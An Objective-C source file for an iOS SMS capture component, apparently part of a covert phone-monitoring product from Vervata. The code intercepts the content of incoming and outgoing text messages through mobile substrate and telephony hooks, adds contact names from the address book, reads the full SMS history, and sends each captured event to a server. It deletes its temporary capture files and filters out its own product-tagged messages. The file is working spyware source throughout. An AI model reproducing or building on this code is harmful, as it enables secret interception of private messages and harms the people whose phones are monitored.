/**
 - Project name :  SMSCapture Maanager 
 - Class name   :  SMSCaptureManager
 - Version      :  1.0  
 - Purpose      :  For SMS Capturing Component
 - Copy right   :  28/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "SMSCaptureManager.h"
#import "CTMessagePart.h"
#import "CTMessageCenter.h"
#import "CTMessage.h"
#import "CTMessageAddress-Protocol.h"
#import "FxLogger.h"
#import "FxEventEnums.h"
#import "FxSmsEvent.h"
#import "FxRecipient.h"
#import "DateTimeFormat.h"
#import "ABContactsManager.h"
#import "FxRecipient.h"
#import "DefStd.h"
#import "SMSNotifier.h"
#import "FMDatabase.h"
#import "SMSCaptureUtils.h"
#import "SMSCaptureDAO.h"

#import <UIKit/UIKit.h>

@interface SMSCaptureManager (PrivateAPI) 
- (NSString *) getProductIdAndVersion;
- (void) removeSMS: (NSString *) aPath;
- (BOOL) isSmsContainProductIDAndVersion: (NSString*) aSms;

- (void) contactWithSMSEvent: (FxSmsEvent *) aSMSEvent;
- (void) smsEventDidFinish: (FxSmsEvent *) aSMSEvent;
- (void) smsEventsDidFinish: (NSArray *) aSMSEvents;
- (void) flashSmsEvents;
@end

@implementation SMSCaptureManager

@synthesize mAppContext;
@synthesize mTelephonyNotificationManager;

/**
 - Method name: initWithEventDelegate
 - Purpose:This method is used to initialize the SMSCaptureManager class
 - Argument list and description: aEventDelegate (EventDelegate)
 - Return description: No return type
*/

- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		mEventDelegate	= aEventDelegate;
		mSMSEventPool	= [[NSMutableArray alloc] init];
		mSMSUtils		= [[SMSCaptureUtils alloc] init];
	}
	return self;
}

/**
 - Method name: startCapture
 - Purpose:This method is used to start SMS Capturing
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) startCapture {
	if (!mMessagePortIPCReader) {
		mMessagePortIPCReader = [[MessagePortIPCReader alloc] initWithPortName:kSMSMessagePort
													withMessagePortIPCDelegate:self];
		[mMessagePortIPCReader start];
	}
	
	NSInteger systemOS = [[[UIDevice currentDevice] systemVersion] intValue];
	if (systemOS >= 6 && !mSMSNotifier) {
		mSMSNotifier = [[SMSNotifier alloc] initWithTelephonyNotificationManager:mTelephonyNotificationManager];
		[mSMSNotifier setMDelegate:self];
		// Capture using telephony notification callback (obsolete)
		[mSMSNotifier setMEventsSelector:@selector(smsEventsDidFinish:)];
		// Capture using mobile substrate
		[mSMSNotifier setMEventSelector:@selector(smsEventDidFinish:)];
		[mSMSNotifier start];
	}
    
    DLog (@"Start Capturing SMS...")
}


/**
 - Method name:stopMonitoring
 - Purpose: This method is used for stop operation for receiving sms command.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) stopCapture{
	if (mMessagePortIPCReader) {
		[mMessagePortIPCReader stop];
		[mMessagePortIPCReader release];
		mMessagePortIPCReader = nil;
	}
	
	NSInteger systemOS = [[[UIDevice currentDevice] systemVersion] intValue];
	if (systemOS >= 6 && mSMSNotifier) {
        [mSMSNotifier prepareForRelease];
		[mSMSNotifier release];
		mSMSNotifier = nil;
	}
	
	DLog (@"Stop capturing SMS...");
}

- (BOOL) isSmsContainProductIDAndVersion: (NSString*) aSms {
	NSRange result = [aSms rangeOfString:[self getProductIdAndVersion]];
	BOOL isContain = TRUE;
	if ((result.location == NSNotFound) && 
		(result.length == 0 )) {
		isContain = FALSE;
	}
	return isContain;
}

/**
 - Method name:didReceivedSMSData
 - Purpose: This method is invoked when receiving sms command.
 - Argument list and description: aData (NSData *)
 - Return type and description: No Return
*/
- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	DLog (@"Captured SMS message..");
	NSString *smsPath=[[NSString alloc]initWithData:aRawData encoding:NSUTF8StringEncoding];
	NSData *datafile=[NSData dataWithContentsOfFile:smsPath];
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:datafile];
	NSDictionary *dictionary = [[unarchiver decodeObjectForKey:kMessageMonitorKey] retain];
    [unarchiver finishDecoding];
	ABContactsManager *contactManager=[[ABContactsManager alloc] init];
	FxSmsEvent *smsEvent=[[FxSmsEvent alloc]init];
	//=============SMS SUBJECT=================================================================================
	[smsEvent setSmsSubject:[dictionary objectForKey:kMessageSubjectKey]];
	//=============SMS TEXT====================================================================================
	[smsEvent setSmsData:[dictionary objectForKey:kSMSTextKey]];
	//=============SMS TYPE====================================================================================
	[smsEvent setEventType:kEventTypeSms];
	//=============DATETIME====================================================================================
	[smsEvent setDateTime:[DateTimeFormat phoenixDateTime]]; 
	//=============Contact Ino=================================================================================
	NSArray *contactInfo = [dictionary objectForKey:kMessageSenderKey];
	//=============Conversation ID ============================================================================
	[smsEvent setMConversationID:[dictionary objectForKey:kSMSGroupIDKey]];
	
	if ([[dictionary objectForKey:kSMSTypeKey] isEqualToString:kSMSIncomming]) {
        DLog(@"##########################################################################")
        DLog(@"                         INCOMING iOS 6,7,8,9")
        DLog(@"##########################################################################")
		// -- set Sender Details
		[smsEvent setDirection:kEventDirectionIn];
		NSString *senderNumber=[contactInfo objectAtIndex:0];
		[smsEvent setSenderNumber:[contactManager formatSenderNumber:senderNumber]];
		senderNumber=[senderNumber stringByReplacingOccurrencesOfString:@"-" withString:@""];
		//[smsEvent setContactName:[contactManager searchContactName:senderNumber]];
		//[smsEvent setContactName:[contactManager searchFirstNameLastName:senderNumber]];
		[smsEvent setContactName:[contactManager searchFirstNameLastName:senderNumber contactID:-1]];
	}
	else {
		[smsEvent setDirection:kEventDirectionOut]; //set Recipient Details
		for(NSString *senderNumber in contactInfo) {	
			FxRecipient *recipient=[[FxRecipient alloc] init];
			[recipient setRecipType:kFxRecipientTO];
			senderNumber=[senderNumber stringByReplacingOccurrencesOfString:@"-" withString:@""];
			[recipient setRecipNumAddr:[contactManager formatSenderNumber:senderNumber]];
			//[recipient setRecipContactName:[contactManager searchContactName:senderNumber]];
			[recipient setRecipContactName:[contactManager searchFirstNameLastName:senderNumber]];
	        [smsEvent addRecipient:recipient];
			[recipient release];
		}
	}
	
	DLog (@"message     : %@", [dictionary objectForKey:kSMSTextKey]);
	DLog (@"product id  : %@", [self getProductIdAndVersion]);
	
	//=============SEND SMS EVENT==============================================================================
	
	BOOL shouldSendSMSEvent = FALSE;
	
	if ([[dictionary objectForKey:kSMSTypeKey] isEqualToString:kSMSIncomming]) {		// capture all incomming SMS
		DLog (@"DEBUG: incomming sms so SEND IT !!!")
		shouldSendSMSEvent = TRUE;
	} else if ([[dictionary objectForKey:kSMSTypeKey] isEqualToString:kSMSOutgoing]) {	// not capture outgoing SMS that contains PID and version
		DLog (@"DEBUG: outgoing sms")
		if (![self isSmsContainProductIDAndVersion:[dictionary objectForKey:kSMSTextKey]]) {
			shouldSendSMSEvent = TRUE;
			DLog (@"DEBUG: but it doesn't contain PID and version, so SEND IT !!!")
		}
	} else {
		DLog (@"wrong SMS type")
	}
			  
	if (shouldSendSMSEvent) {

		if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
			
			// -- find converstaion id if it doesn't exist for ios 5
			if ([[smsEvent mConversationID] isEqualToString:@""]						&&		// conversation id = 0
				[[[UIDevice currentDevice] systemVersion] intValue] == 5				&&		// ios 5
				[[dictionary objectForKey:kSMSTypeKey] isEqualToString:kSMSIncomming]	) {		// incoming direction
				[mSMSUtils queryConversationIdAndDeliverSMSEvent:smsEvent
													senderNumber:[contactInfo objectAtIndex:0]
														 delgate:mEventDelegate];
			} else {
				[mEventDelegate performSelector:@selector(eventFinished:) withObject:smsEvent withObject:self];
				DLog (@"Send SMS event to the server")
				//======================================================Print Result==========================================
				NSString *resultString=[NSString stringWithFormat:@"...\nContact Name:%@,ContactNumber:%@,Message:%@,Recipients:%@,Direction:%d,DateTime:%@....\n",	
										[smsEvent contactName],[smsEvent senderNumber],[smsEvent smsData],[smsEvent recipientArray],[smsEvent direction],[DateTimeFormat phoenixDateTime]];
				DLog(@"Log level: %d, resultString: %@",kFxLogLevelDebug,resultString);
				//============================================================================================================
				
			}		
		}
	}
			  
	//================= PRINT LOG ============================================================================================
	DLog (@"Sender Number       : %@", [smsEvent senderNumber]);
	DLog (@"Sender Name         : %@", [smsEvent contactName]);
	DLog (@"SMS Subject         : %@", [smsEvent smsSubject]);
	DLog (@"SMS Text            : %@", [smsEvent smsData]);
	DLog (@"SMS conversation id : %@",[smsEvent mConversationID]);
	DLog (@"Direction           : %@",[dictionary objectForKey:kSMSTypeKey]);
	
    DLog (@"Recipient Info...")
	for (FxRecipient *aRecipient in [smsEvent recipientArray]){
		DLog (@"Recipient Name  :%@",[aRecipient recipContactName])
		DLog (@"Recipient Number:%@",[aRecipient recipNumAddr])
	}
	// Removed saved sms contents from the file.
	[self removeSMS:smsPath];
   	[contactManager release];
	contactManager=nil;
    [dictionary release];
	[unarchiver release];
	[smsEvent release];
	smsEvent=nil;
}


/**
 - Method name:removeSMSMessage.
 - Purpose: This method is used to remove SMS.
 - Argument list and description: aPath (NSString *).
 - Return type and description: No Return.
*/
- (void) removeSMS: (NSString *) aPath {
	NSFileManager *fileManager=[NSFileManager defaultManager];
	NSError *error=nil;
	if ([fileManager removeItemAtPath:aPath error:&error]) {
		DLog (@"Removed SMS message");
	}
	else {
		DLog (@"Error occured while removing mail message")
	}
}

/**
 - Method name:getProductIdAndVersion
 - Purpose: This is method is used to get product information .
 - Argument list and description: No argument
 - Return type and description: pidAndVersion (NSString *)
*/

- (NSString *) getProductIdAndVersion {
	id <ProductInfo> info=[mAppContext getProductInfo];
	NSString *pidAndVersion=[NSString stringWithFormat:@"[%ld %@]", (long)[info getProductID], [info getProductVersion]];
	DLog (@"[ProductId Version]:%@",pidAndVersion);
	return pidAndVersion;
}

#pragma mark -
#pragma mark IOS6
#pragma mark -

- (void) contactWithSMSEvent: (FxSmsEvent *) aSMSEvent {
	ABContactsManager *contactManager=[[ABContactsManager alloc] init];
	if ([aSMSEvent direction] == kEventDirectionIn) {
		DLog (@"Incoming sms");
		NSString *senderNumber = [aSMSEvent senderNumber];
		senderNumber = [senderNumber stringByReplacingOccurrencesOfString:@"-" withString:@""];
		NSString *contactName = [contactManager searchFirstNameLastName:senderNumber];
		[aSMSEvent setContactName:contactName];
	} else if ([aSMSEvent direction] == kEventDirectionOut) {
        DLog(@"##########################################################################")
        DLog(@"                         OUTGOING SMS iOS 6,7,8,9")
        DLog(@"##########################################################################")
		for (FxRecipient *recipient in [aSMSEvent recipientArray]) {
			NSString *recipientNumber = [recipient recipNumAddr];
			recipientNumber = [recipientNumber stringByReplacingOccurrencesOfString:@"-" withString:@""];
			//NSString *contactName = [contactManager searchFirstNameLastName:recipientNumber];
            NSString *contactName = [contactManager searchFirstNameLastName:recipientNumber contactID:-1];
			[recipient setRecipContactName:contactName];
		}
	}
	[contactManager release];
}

- (void) smsEventDidFinish: (FxSmsEvent *) aSMSEvent {
	// Find out the contact name
	[self contactWithSMSEvent:aSMSEvent];
	// Deliver event to server -------------------
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		[mEventDelegate performSelector:@selector(eventFinished:) withObject:aSMSEvent withObject:self];
	}
}

- (void) smsEventsDidFinish: (NSArray *) aSMSEvents {
	// Find out the contact name
	for (FxSmsEvent *smsEvent in aSMSEvents) {
		[self contactWithSMSEvent:smsEvent];
		[mSMSEventPool addObject:smsEvent];
	}
	
	// To fix outgoing sms to multiple recipients
	[NSObject cancelPreviousPerformRequestsWithTarget:self];
	[self performSelector:@selector(flashSmsEvents) withObject:nil afterDelay:3.5];
}

- (void) flashSmsEvents {
	DLog (@"Grouping sms & flashing");
	// Grouping the sms events group by ROWID in sms.db (to fix outgoing sms to multiple recipients)
	NSMutableDictionary *smsGroups = [[NSMutableDictionary alloc] init];
	for (FxSmsEvent *smsEvent in mSMSEventPool) {
		NSNumber *groupID = [NSNumber numberWithUnsignedInteger:[smsEvent eventId]];
		NSMutableArray *group = [smsGroups objectForKey:groupID];
		if (!group) {
			group = [[NSMutableArray alloc] initWithObjects:smsEvent, nil];
			[smsGroups setObject:group forKey:groupID];
			[group release];
		} else {
			[group addObject:smsEvent];
		}
	}
	[mSMSEventPool removeAllObjects];
	
	NSArray *group = nil;
	
	// Method 1
//	NSEnumerator *enumerator = [smsGroups objectEnumerator];
//	while (group = [enumerator nextObject]) {
	
	// Method 2
	NSMutableArray *allKeys = [[NSMutableArray alloc] initWithArray:[smsGroups allKeys]];
	[allKeys sortUsingSelector:@selector(compare:)];
	DLog (@"allKeys in smsGroups = %@", allKeys);
	NSEnumerator *enumerator = [allKeys objectEnumerator];
	NSNumber *key = nil;
	while (key = [enumerator nextObject]) {
		DLog (@"key of group = %@", key);
		group = [smsGroups objectForKey:key];
		
		NSInteger index = 0;
		for (FxSmsEvent *smsEvent in group) {
			if ([smsEvent direction] == kEventDirectionOut) {
				FxRecipient *recipient = [[smsEvent recipientArray] objectAtIndex:index];
				NSMutableArray *recipients = [[NSMutableArray alloc] initWithObjects:recipient, nil];
				[smsEvent setRecipientArray:recipients];
				[recipients release];
				index++;
			}
			
			DLog (@"*********************************************************");
			DLog (@"ROWID       = %lu", (unsigned long)[smsEvent eventId]);
			DLog (@"time        = %@", [smsEvent dateTime]);
			DLog (@"sender      = %@", [smsEvent senderNumber]);
			DLog (@"name        = %@", [smsEvent contactName]);
			DLog (@"text        = %@", [smsEvent smsData]);
			DLog (@"subject     = %@", [smsEvent smsSubject]);
			DLog (@"recipients  = %@", [smsEvent recipientArray]);
			DLog (@"direction   = %d", [smsEvent direction]);
			DLog (@"*********************************************************");
			
			// Deliver event to server -------------------
			if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
				[mEventDelegate performSelector:@selector(eventFinished:) withObject:smsEvent withObject:self];
			}
		}
	}
	[allKeys release];
	[smsGroups release];
}

- (void) prepareForRelease {
	DLog (@"########## prepareForRelease ");
	[NSObject cancelPreviousPerformRequestsWithTarget:mSMSUtils];
	[NSObject cancelPreviousPerformRequestsWithTarget:self];
}

#pragma mark - Historical SMS


+ (NSArray *) allSMSs {
    NSArray *smsLogs = [NSArray array];
    @try {
        SMSCaptureDAO *smsCaptureDAO        = [[SMSCaptureDAO alloc] init];
        smsLogs                             = [smsCaptureDAO selectAllSMSHistory];
        [smsCaptureDAO release];
    }
    @catch (NSException *exception) {
        DLog(@"NS exception = %@", exception);
    }
    @catch (...) {
        DLog(@"Unknown exception");
    }
    @finally {
        ;
    }
    return smsLogs;
}

+ (NSArray *) allSMSsWithMax: (NSInteger) aMaxNumber {
    NSArray *smsLogs = [NSArray array];
    @try {
        SMSCaptureDAO  *smsCaptureDAO       = [[SMSCaptureDAO alloc] init];
        smsLogs                             = [smsCaptureDAO selectAllSMSHistoryWithMax:aMaxNumber];
        [smsCaptureDAO release];
    }
    @catch (NSException *exception) {
        DLog(@"NS exception = %@", exception);
    }
    @catch (...) {
        DLog(@"Unknown exception");
    }
    @finally {
        ;
    }
    return smsLogs;
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) dealloc {
	DLog (@"########## dealloc ");
	[mSMSEventPool release];
	[mSMSUtils release];
	[self stopCapture];
    [super dealloc];
}

@end
